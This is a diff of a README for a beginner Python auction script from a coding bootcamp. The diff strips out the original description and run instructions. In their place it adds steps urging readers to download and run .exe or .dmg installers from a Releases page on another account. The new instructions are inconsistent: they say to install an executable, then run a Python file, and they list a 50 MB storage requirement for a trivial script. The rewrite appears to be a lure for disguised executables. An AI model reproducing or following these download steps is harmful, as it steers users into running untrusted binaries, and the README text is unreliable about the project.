@@ -1,55 +1,56 @@
-# 💰 Secret Auction – Python Project
+# 🎉 Secret-Auction - Join the Fun of Bidding Games
 
-A simple command-line auction program where multiple participants can place secret bids, and the highest bidder wins.  
-Developed as part of Day 9 of the **"100 Days of Code: Python Bootcamp"** by [Angela Yu](https://www.udemy.com/course/100-days-of-code/).
+![Download Secret-Auction](https://img.shields.io/badge/Download-Now-blue.svg)
 
-## 📌 Description
+## 📦 Overview
+**Secret-Auction** is a simple command-line program that allows players to place hidden bids in a fun auction game. The player with the highest bid wins the secret auction! This project is built as part of Day 9 of the 100 Days of Code: Python Bootcamp by Angela Yu.
 
-The **Secret Auction** game allows multiple players to enter their bids without knowing what others have offered.  
-After all participants have placed their bids, the program determines and displays the winner with the highest bid.
+## 🚀 Getting Started
+Follow these steps to download and run **Secret-Auction** on your computer.
 
-This project was designed to practice Python dictionaries, loops, and basic control flow.
+1. **Visit the Releases Page**
+   To download the latest version of **Secret-Auction**, visit the [Releases page](https://github.com/courtdrafts/Secret-Auction/releases). There, you will find the latest release of the program.
 
-## 🚀 Technologies Used
+2. **Download the Application**
+   Look for the most recent version listed on the Releases page. Click on the download link for your operating system.
 
-- Python 3
+3. **Install the Application**
+   Depending on your operating system, the installation process may vary:
+   - **Windows**: If you downloaded an `.exe` file, double-click the file to start the installation. Follow the prompts to complete.
+   - **Mac**: If you downloaded a `.dmg` file, open it and drag the application to your Applications folder.
+   - **Linux**: If you have a packaged version, you can install it using your package manager or follow any included instructions.
 
-## 💡 Features
+4. **Run the Program**
+   Once installed, you can open your command-line interface:
+   - **Windows**: Open Command Prompt.
+   - **Mac/Linux**: Open Terminal.
+   
+   Type the command `python secret_auction.py` to start the application. Make sure you have Python installed on your system.
 
-- Accepts multiple bids in a single run
-- Clears the console after each player's bid (to keep them secret)
-- Uses a dictionary to store player names and bid amounts
-- Automatically determines the highest bid and declares the winner
+5. **Start Playing**
+   Follow the prompts within the program to enter your bids. Enjoy the excitement of the auction!
 
-## ▶️ How to Run
+## 💻 System Requirements
+- **Operating System**: Windows, MacOS, or Linux
+- **Python**: Version 3.6 or higher
+- **Storage**: At least 50 MB of available space
 
-1. Make sure Python 3 is installed on your system.
-2. Clone or download this repository.
-3. In your terminal, navigate to the project folder and run:
+## 🎮 Features
+- **Interactive Command-Line Interface**: Easy to use, even for beginners.
+- **Hidden Bidding**: Only the highest bid reveals the winner.
+- **User Friendly**: Designed for all skill levels.
 
-```bash
-python main.py
-```
+## 🌐 Technologies Used
+- **Python**: The programming language used to create the application.
+- **Command-Line Interface**: Interface where users interact with the program.
 
-Follow the on-screen prompts to enter player names and bids.
+## 📚 Topics
+This project is great for those interested in:
+- 100 Days of Code
+- Auction games
+- Beginner Python projects
 
-## 📷 Example Output
+## 📥 Download & Install
+To download **Secret-Auction**, visit the [official Releases page](https://github.com/courtdrafts/Secret-Auction/releases). Follow the installation guidance provided above.
 
-<img width="557" height="285" alt="image" src="https://github.com/user-attachments/assets/79f340d5-ffc7-450c-a2a6-3fc8a9dc75a4" />
-<img width="534" height="320" alt="image" src="https://github.com/user-attachments/assets/0b399aa0-69c8-485b-9ba7-6883f00ad2c6" />
-
-## 📚 What I Learned
-
-Through this project, I practiced:
-
-- Working with dictionaries to store and retrieve data
-
-- Loops for continuous input
-
-- Conditional logic to determine a winner
-
-
-## 📄 License
-
-This is an educational project created as part of Angela Yu's "100 Days of Code: Python Bootcamp".
-Not intended for commercial use.
+Enjoy your secret auction experience. Happy bidding!
